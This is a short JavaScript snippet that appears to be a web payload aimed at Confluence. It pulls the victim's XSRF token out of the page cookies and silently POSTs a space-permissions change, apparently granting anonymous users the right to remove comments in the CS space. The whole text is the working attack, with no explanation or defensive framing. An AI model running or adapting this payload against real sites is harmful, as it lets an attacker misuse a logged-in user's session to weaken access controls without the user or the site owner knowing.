var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://test7000.atlassian.net/wiki/spaces/doeditspacepermissions.action?key=CS', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = xhr.responseText;
    console.log(response);
  }
};
var cookieValue = document.cookie.match(/(^|;\s*)atl\.xsrf\.token=([^;]+)/);
var atlToken = cookieValue ? cookieValue[2] : '';

var requestBody = 'atl_token=' + encodeURIComponent(atlToken)+ '&confluence_checkbox_removecomment_anonymous=on&redirectedFromSection=%24action.redirectedFromSection';
xhr.send(requestBody);
